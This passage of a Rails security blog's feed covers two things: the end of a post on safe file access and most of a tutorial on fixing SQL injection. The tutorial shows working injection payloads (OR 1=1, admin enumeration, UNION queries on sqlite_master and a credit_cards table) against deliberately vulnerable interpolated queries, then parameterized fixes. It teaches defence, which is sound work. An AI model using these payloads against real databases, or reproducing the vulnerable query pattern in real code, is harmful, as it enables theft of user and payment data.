</span><span class='line'><span class="n">download</span> <span class="o">=</span> <span class="no">FileDownload</span><span class="o">.</span><span class="n">find_by</span><span class="p">(</span><span class="n">file_guid</span><span class="p">:</span> <span class="n">params</span><span class="o">[</span><span class="ss">:file_guid</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'><span class="n">send_file</span><span class="p">(</span><span class="n">download</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="ss">filename</span><span class="p">:</span> <span class="n">download</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="ss">type</span><span class="p">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice in the above code that a GUID is used as the value that gets submitted to the server, and not the actual
file name. This makes it impossible for an attacker to download a file they&rsquo;re not allowed to, and also keeps
you safe from any manipulation of the file name or path. This technique will work for moving, deleting, renaming,
and sending files as long as you know files names and paths ahead of time. It is the best way to secure your app.</p>

<h3>Partial Restriction</h3>

<p>Ideally you wouldn&rsquo;t have to resort to any other techniques for protection, however the real world is a bit
messier. And sometimes you don&rsquo;t have all the information you need in order to use an identifier. In cases like this
you want to &ldquo;sandbox&rdquo; your users as much as possible by limiting access within the file system:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># HTML</span>
</span><span class='line'><span class="o">&lt;</span><span class="nb">select</span> <span class="nb">name</span><span class="o">=</span><span class="s2">&quot;file_name&quot;</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="n">option</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;file1.log&quot;</span><span class="o">&gt;</span><span class="n">file1</span><span class="o">.</span><span class="n">log</span><span class="o">&lt;</span><span class="sr">/option&gt;</span>
</span><span class='line'><span class="sr">  &lt;option value=&quot;file2.log&quot;&gt;file2.log&lt;/o</span><span class="n">ption</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="n">option</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;file3.log&quot;</span><span class="o">&gt;</span><span class="n">file3</span><span class="o">.</span><span class="n">log</span><span class="o">&lt;</span><span class="sr">/option&gt;</span>
</span><span class='line'><span class="sr">&lt;/se</span><span class="n">lect</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Controller</span>
</span><span class='line'><span class="n">file_name</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:file_name</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># if possible current_user.download_directory should be an identifier</span>
</span><span class='line'><span class="c1"># and controlled 100% by the server.</span>
</span><span class='line'><span class="n">download_path</span> <span class="o">=</span> <span class="s2">&quot;downloads/</span><span class="si">#{</span><span class="n">current_user</span><span class="o">.</span><span class="n">download_directory</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="no">File</span><span class="o">.</span><span class="n">exists?</span><span class="p">(</span><span class="n">download_path</span><span class="p">)</span>
</span><span class='line'>  <span class="n">send_file</span> <span class="n">download_path</span><span class="p">,</span> <span class="ss">filename</span><span class="p">:</span> <span class="n">file_name</span><span class="p">,</span> <span class="ss">type</span><span class="p">:</span> <span class="s2">&quot;text/plain&quot;</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'>  <span class="c1"># return an error message</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here you can use a <a href="http://gavinmiller.io/2016/creating-a-secure-sanitization-function/"><code>sanitize</code> function to clear <code>params[:file_name]</code> of any dangerous characters</a>. In this way
you&rsquo;re accessing the file system in a controlled manner.</p>

<h3>Filtered Restriction</h3>

<p>The next technique to limit file access trouble is by restricting to specific file types. Here you want to
whitelist the types of files that a user can access, such as only <code>.pdf</code> files on the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:filename</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">payload</span> <span class="o">=~</span> <span class="sr">/.pdf$/</span>
</span><span class='line'>  <span class="n">send_file</span><span class="p">(</span><span class="s2">&quot;downloads/</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="ss">filename</span><span class="p">:</span> <span class="s1">&#39;report.pdf&#39;</span><span class="p">,</span> <span class="ss">type</span><span class="p">:</span> <span class="s2">&quot;application/pdf&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'>  <span class="k">raise</span> <span class="s2">&quot;Unknown file format requested&quot;</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a line of defense that makes sure that you&rsquo;re not leaking any sensitive information like a <code>database.yml</code>
file. And again make sure to use a <code>sanitize</code> function!</p>

<p>The place you have to be careful here is that whitelisted file extensions can be exploited if an attacker is
able to move or rename files. Specifically if they are able to add a <code>.pdf</code> extension to <code>database.yml</code> then
they&rsquo;re able to download the <code>database.yml.pdf</code> file. That&rsquo;s where multiple vulnerabilities come in
as mentioned before. An attacker uses one File Access vulnerability to rename the file, and another to
download it.</p>

<h3>Store User Files on a Different Server</h3>

<p>These days disk space is cheap. One great way to avoid opening your web server up to compromise is to limit data
stored on the system. This means leveraging tools like Amazon S3, or DreamHost&rsquo;s Dream Objects to store user
files, generated reports, etc. on a server that is loosely coupled to your app.</p>

<p>As I mentioned in the opening paragraph of this post, you can still shoot yourself in the foot and have an
attacker gain access to files they shouldn&rsquo;t with external storage. Storing your files externally simply
separates systems (called a boundary) so that a compromise of your data storage system, doesn&rsquo;t also compromise
your web server.</p>

<p>The added benefit of storing data on other servers is that it will help you scale the load your servers can
handle and can reduce processing cycles for those files.</p>

<h3>Use an Intermediary</h3>

<p>One of the great tools to come out of the &ldquo;dev ops revolution&rdquo; is Chef. I use Chef on a regular basis and
within the apps that I develop our team uses Chef to manage server configurations. With Chef you can
create a boundary between your Ruby/Rails app and your configuration code. Then when you&rsquo;re passing
information between the web app and chef you can ask yourself: &ldquo;Is this data dangerous?&rdquo; It&rsquo;s a subtle
distinction and if you&rsquo;re doing enough system calls it&rsquo;s worth the investment.</p>

<p>But before you jump on the Chef bandwagon, having an intermediary isn&rsquo;t going to solve the File Access problem.
At the end of the day you&rsquo;re going to need to <strong>pay attention</strong> to what you&rsquo;re doing. The nice bit about Chef
is that you can come up with ground rules on your team like:</p>

<ul>
<li>No system calls in main app, only in Chef</li>
<li>Heavily sanitized user input, used sparingly in Chef</li>
<li>Code Review by two or more people for Chef changes</li>
<li>Quarterly review of chef code for vulnerabilities</li>
</ul>


<p>You get the idea, create a separation of concerns between safe code and hazardous code!</p>

<h3>Use Dangerous Methods Sparingly</h3>

<p>There&rsquo;s a good chance that a lot of the methods listed above won&rsquo;t be useful for you. And really that&rsquo;s the
best case scenario. At the end of the day, not using a dangerous method is the #1 technique for keeping your
app safe.</p>

<p>When you&rsquo;re being asked to implement the <em>amazing new feature that involves file access</em>, you
can provide constructive feedback on potential harms that these types of features can bring to the table.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fixing SQL Injection Vulnerabilities in Ruby/Rails]]></title>
    <link href="http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities/">
    <updated>2015-10-13T08:17:00-06:00</updated>
    <id>http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities</id>
    <content type="html"><![CDATA[<p>In a previous post on <a href="http://gavinmiller.io/2015/fixing-command-injection-vulnerabilities">Fixing Command Injection Vulnerabilities</a>
you saw the damage that can be caused when an attacker gets access to your system. It&rsquo;s basically Game Over!</p>

<p><img src="http://gavinmiller.io/images/sql-injection/game-over.jpg" alt="Nelson from the simpsons laughing at a Game Over screen" /></p>

<p>The same is true of SQL Injection also known as SQLi. The dangers of SQL Injection have been talked about for
a long time, but for many developers they&rsquo;ve never seen it in practice. This post is going to explore what a
SQL Injection is, why you need to fix it, and how to fix it!</p>

<h2>What is a SQL Injection Vulnerability?</h2>

<p>SQL Injection falls into the Injection category of vulnerabilities detailed in the OWASP Top 10.
SQL Injection is easy to exploit, occurs commonly, and the impact is severe. <strong>As a
professional software developer it is your job to recognize and fix these vulnerabilities!</strong></p>

<p>This is what SQL Injection looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all that&rsquo;s required for an attacker to gain access to your entire database. Don&rsquo;t believe me? Let&rsquo;s see
how an attacker could own your database.</p>

<h3>Basic Exploitation</h3>

<p>Since an attacker has full control of <code>payload</code> (for example sake let&rsquo;s say via <code>params[:email]</code>)
they can insert whatever they&rsquo;d like into your <code>where</code> query. Here&rsquo;s an example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com/query?email=&#39;) or 1=1--</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39;) or 1=1--&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="n">render</span> <span class="vi">@user</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#=&gt; #&lt;User id: 1, email: &quot;a@a.com&quot;, name: &quot;A&quot;, admin: false, created_at: &quot;2015-10-02 13:14:38&quot;, updated_at: &quot;2015-10-02 13:14:38&quot;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Above the attacker is sending a payload of <code>') or 1=1--</code>. It works like this:</p>

<ol>
<li>The first part of the payload <code>')</code> sets the query to return zero results; email is blank: <code>email=''</code>.</li>
<li>The second part, <code>1=1</code> always equals true, which results in the first entry in the <code>users</code> table being returned.</li>
<li>The final part, <code>--</code> is a SQL comment. This is a technique to cancel out any further query modifications that
could occur server side. Essentially, this reduces the fine tuning to make a payload work.</li>
</ol>


<p>Simplified, most SQL Injections will follow this type of payload format:</p>

<ol>
<li>Close the query</li>
<li>Insert the attack</li>
<li>Prevent server modifications</li>
</ol>


<p>While this seems trivial, an attacker can now manipulate payloads to get access to juicier
information. Let&rsquo;s see another example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com/query?email=&#39;) or admin=&#39;t&#39;--</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39;) or admin=&#39;t&#39;--&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="n">render</span> <span class="vi">@user</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#=&gt; #&lt;User id: 193, email: &quot;admin1@email.com&quot;, name: &quot;Admin1&quot;, admin: true, created_at: &quot;2015-09-28 01:33:39&quot;, updated_at: &quot;2015-09-28 01:58:35&quot;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using the payload <code>') or admin='t'--</code> the attacker has gotten the system to return an admin user. They now
have knowledge about an admin in your database.</p>

<h3>Enumerating</h3>

<p>In order to get a full dump of admin accounts the attacker needs to be able to enumerate through your admin
table. It turns out that this is trivial to accomplish using an id filter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com/query?email=&#39;) or admin=&#39;t&#39; and id &gt; 193--</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39;) or admin=&#39;t&#39; and id &gt; 193--&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="n">render</span> <span class="vi">@user</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#=&gt; #&lt;User id: 291, email: &quot;admin2@email.com&quot;, name: &quot;Admin2&quot;, admin: true, created_at: &quot;2015-09-28 01:33:39&quot;, updated_at: &quot;2015-09-28 01:58:35&quot;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here the attacker adds <code>and id &gt; 193</code> to get the next admin user. At this point, they keep incrementing
id until they dump every admin out of your database.</p>

<p>In the back of your mind maybe you&rsquo;re thinking:</p>

<blockquote><p>&ldquo;My user table gets owned, but I encrypt my passwords so at least the damage is just limited to a single
table. Big deal if someone gets access to all my user&rsquo;s &hellip; that&rsquo;s not too bad &hellip; right?&rdquo;</p></blockquote>

<p>Now you&rsquo;re smart so <em>I&rsquo;m sure you didn&rsquo;t say that to yourself</em>. Because this is bad. And an attacker can do
worse!</p>

<h3>Discovering Other Tables</h3>

<p><aside>
The first step in accessing more than just the <code>users</code> table is finding out what other tables exist. This step
is going to be slightly different based upon the underlying database that you&rsquo;re using. Every
database has some type of functionality similar to what is demonstrated here with varying syntax.
For the purposes of this example, a sqlite3 database is used.
</aside></p>

<p>How can an attacker find out what other tables exist in the application? Via the <code>sqlite_master</code> table.
This table lists the entire database&rsquo;s schema including tables and indexes.</p>

<p>In order to access this information a couple of new techniques will be required. Let&rsquo;s see
the payload first and then look at the techniques:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com/query?email=&#39;) union select 1,name,1,1,1,1 from sqlite_master--</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39;) union select 1,name,1,1,1,1 from sqlite_master--&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="n">render</span> <span class="vi">@user</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#=&gt; #&lt;User id: 1, email: &quot;schema_migrations&quot;, name: &quot;1&quot;, admin: true, created_at: 1, updated_at: 1&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first new technique is the addition of the <a href="http://www.tutorialspoint.com/sqlite/sqlite_unions_clause.htm"><code>union</code></a>
operator.  This is a SQL operator (not limited to sqlite3) that combines the result of two select statements.</p>

<p>This payload also introduces a new technique of querying a system table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="nb">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="n">from</span> <span class="n">sqlite_master</span><span class="o">--</span>
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s happening here is that the attacker is selecting the name column from the <code>sqlite_master</code> table, and then inserting
1&rsquo;s to fill out the remaining columns. Without those 1&rsquo;s the database would throw an exception:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>SELECTs to the left and right of UNION do not have the same number of result columns:
</span><span class='line'>SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE (email = &#39;&#39;) union select
</span><span class='line'>name, 1, 1, 1, 1 FROM sqlite_master--&#39;) ORDER BY &quot;users&quot;.&quot;id&quot; ASC LIMIT 1
</span></code></pre></td></tr></table></div></figure>


<p>The end query that gets sent to the database looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="ss">&quot;users&quot;</span><span class="p">.</span><span class="o">*</span> <span class="k">FROM</span> <span class="ss">&quot;users&quot;</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">email</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">UNION</span>
</span><span class='line'><span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">FROM</span> <span class="n">sqlite_master</span><span class="c1">--&#39;)  ORDER BY &quot;users&quot;.&quot;id&quot; ASC LIMIT 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>Remember that the first query to <code>users</code> doesn&rsquo;t return a result so the result of the second query is interpreted
as a <code>User</code> and fills a <code>User</code> object with the <code>sqlite_master</code> information. Specifically, the payload is crafted
so that the name field corresponds with the email field in <code>User</code>.</p>

<p>In this particular example the result was <code>email: "schema_migration"</code> which isn&rsquo;t helpful. Of course an attacker
could use the enumeratation technique from eariler to traverse the entires in the <code>sqlite_master</code> table, but
that&rsquo;s slow. Instead the payload can be modified to use a function and get all the tables in the database at once!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com/query?email=&#39;) union select 1,group_concat(name, &#39;,&#39;),1,1,1,1 from sqlite_master--</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39;) union select 1,group_concat(name, &#39;,&#39;),1,1,1,1 from sqlite_master--&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="n">render</span> <span class="vi">@user</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#=&gt; #&lt;User id: 1, email: &quot;users,credit_cards,schema_migrations,unique_schema_migrations,sqlite_sequence&quot;, name: &quot;1&quot;, admin: true, created_at: 1, updated_at: 1&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Above the payload is using the <a href="http://www.sqlite.org/lang_aggfunc.html"><code>group_concat</code></a> function provided by sqlite3
to pull together all of the tables into a single value: <code>users,credit_cards,schema_migrations,unique_schema_migrations,sqlite_sequence</code>
And viola, the attacker now has knowledge of every table in your database, including the <code>credit_cards</code> table!</p>

<h3>Accessing Other Tables</h3>

<p>Now that the attacker has discovered the <code>credit_cards</code> table in the application, they&rsquo;re going to pull as much
out of it as they can. Using the same <code>union</code> technique from above:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com/query?email=&#39;) union select 1,number, 1, 1, 1, 1 FROM credit_cards--</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39;) union select 1,number,1,1,1,1 FROM credit_cards--&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="n">render</span> <span class="vi">@user</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#=&gt; #&lt;User id: 1, email: &quot;4242 4242 4242 4242&quot;, name: &quot;1&quot;, admin: true, created_at: 1, updated_at: 1&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The output of <code>User</code> ought to scare you! An attacker has managed to populate the email field with a credit
card number.</p>

<p>For our attacker this is where the party really starts. They have a toe hold into your system, and it&rsquo;s a matter of
time and a simple script to dump all your database. <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/allthethings.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="allthethings">
              allthethings
              </span>
            </span>
          </p>

<h2>How to fix SQL Injection Vulnerabilities</h2>

<p>By now it should be crystal clear why you must fix SQL Injection vulnerabilities. In order to fix your SQL
queries you&rsquo;ll need to use parameterization. Parameterization, in a nutshell, is the safest way to
handle unsafe user input. And whether you&rsquo;re using ActiveRecord, Sequel, ROM, or some other ORM they&rsquo;re all
going to have facilities for parameterizing queries.</p>

<p>Let&rsquo;s look at some common unsafe queries that frequently occur and how to fix them (these examples are
ActiveRecord based.)</p>

<h3>Single Parameter Queries</h3>

<p>The most common use case for Ruby queries is a single parameter.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Unsafe</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = &#39;</span><span class="si">#{</span><span class="n">email</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = &#39;%{email}&#39;&quot;</span> <span class="o">%</span> <span class="p">{</span> <span class="ss">email</span><span class="p">:</span> <span class="n">email</span> <span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Safe</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">email</span><span class="p">:</span> <span class="n">email</span><span class="p">)</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = ?&quot;</span><span class="p">,</span> <span class="n">email</span><span class="p">)</span>
</span><span class='line'><span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">&quot;email = :email&quot;</span><span class="p">,</span> <span class="ss">email</span><span class="p">:</span> <span class="n">email</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>While <code>line 3</code> above looks very similar to <code>line 8</code>, they are different in that <code>line 3</code> uses
<a href="http://ruby-doc.org/core-2.2.0/String.html#method-i-25">string formatting</a> instead of parameterization
which is unsafe for protecting against SQL injection.</p>

<p>Looking at the Unsafe vs Safe examples above you can extrapolate a rule of thumb: <strong>If you have to add surrounding
quotes to your query, you&rsquo;re vulnerable to SQL Injection</strong>.</p>

<h3>Compounding Queries</h3>

<p>Sometimes you need to chain together a series of queries, usually that&rsquo;s with an <code>AND</code> statement:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Unsafe</span>
</span><span class='line'><span class="k">def</span> <span class="nf">unsafe_query</span>
</span><span class='line'>  <span class="n">sql</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>  <span class="n">sql</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;email = </span><span class="si">#{</span><span class="n">email</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">if</span> <span class="n">condition1?</span>
</span><span class='line'>  <span class="n">sql</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;name = </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">&quot;</span>   <span class="k">if</span> <span class="n">condition2?</span>
</span><span class='line'>  <span class="c1"># ... etc</span>
</span><span class='line'>
</span><span class='line'>  <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">sql</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39; and &#39;</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Safe</span>
</span><span class='line'><span class="k">def</span> <span class="nf">safe_query</span>
</span><span class='line'>  <span class="no">User</span><span class="o">.</span><span class="n">all</span><span class="o">.</span><span class="n">tap</span> <span class="k">do</span> <span class="o">|</span><span class="n">query</span><span class="o">|</span>
</span><span class='line'>    <span class="n">query</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">email</span><span class="p">:</span> <span class="n">email</span><span class="p">)</span> <span class="k">if</span> <span class="n">condition1?</span>
</span><span class='line'>    <span class="n">query</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="nb">name</span><span class="p">:</span> <span class="nb">name</span><span class="p">)</span>   <span class="k">if</span> <span class="n">condition2?</span>
</span><span class='line'>    <span class="c1"># ... etc</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>ActiveRecord is great because it allows you to easily chain together multiple pieces of a query and because they&rsquo;re
evaluated lazily.</p>

<p>One of the real tricky places I&rsquo;ve seen people struggle with is <code>OR</code> statements. This is
<a href="https://github.com/rails/rails/commit/9e42cf019f2417473e7dcbfcb885709fa2709f89">in the process of changing</a>
but right now the common pattern is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
